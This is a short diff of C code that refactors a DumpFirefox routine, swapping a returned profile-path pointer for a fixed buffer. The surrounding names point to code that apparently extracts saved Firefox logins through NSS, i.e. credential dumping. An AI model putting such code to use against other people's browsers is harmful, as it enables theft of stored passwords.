@@ -883,16 +883,16 @@ int DumpJsonFF(WCHAR *profilePath, WCHAR *signonFile)
 
 int DumpFirefox(void)
 {
-	WCHAR *ProfilePath = NULL; 	//Profile path
+	WCHAR ProfilePath[MAX_PATH] = {}; 	//Profile path
 	WCHAR FFDir[MAX_PATH];   		//Firefox main installation path
 
 	NSSShutdown = NULL;
 	IsNSSInitialized = 0;
 	NSSInit = NULL;
 
-	ProfilePath = GetFFProfilePath();
+	GetFFProfilePath(ProfilePath, MAX_PATH);
 
-	if (!ProfilePath || !DirectoryExists(ProfilePath)) 
+	if (!DirectoryExists(ProfilePath)) 
 		return 0;
 	
 	GetFFLibPath(FFDir, MAX_PATH);
